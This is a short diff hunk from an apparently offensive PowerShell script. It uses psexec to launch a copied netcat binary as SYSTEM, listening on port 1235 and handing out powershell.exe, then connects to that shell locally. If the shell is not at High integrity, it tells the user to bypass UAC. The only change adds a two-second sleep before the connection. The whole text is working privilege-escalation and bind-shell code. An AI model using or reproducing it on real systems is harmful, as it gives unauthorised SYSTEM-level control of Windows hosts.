@@ -9,6 +9,7 @@ cp C:/blood/nc.exe C:/blood/nc_sys.exe
 
 if($(whoami /groups | Select-String "High Mandatory") -ne $null) {
     Start-Job -ScriptBlock { C:\blood\psexec.exe -accepteula -s ''C:\blood\nc_sys.exe -l 1235 -e powershell.exe'' }
+    Start-Sleep -Seconds 2
     C:\blood\nc_sys.exe 127.0.0.1 1235
 } else {
     Write-Host "You are not in High Integrity Shell (High Mandatory Level), try to bypass UAC."
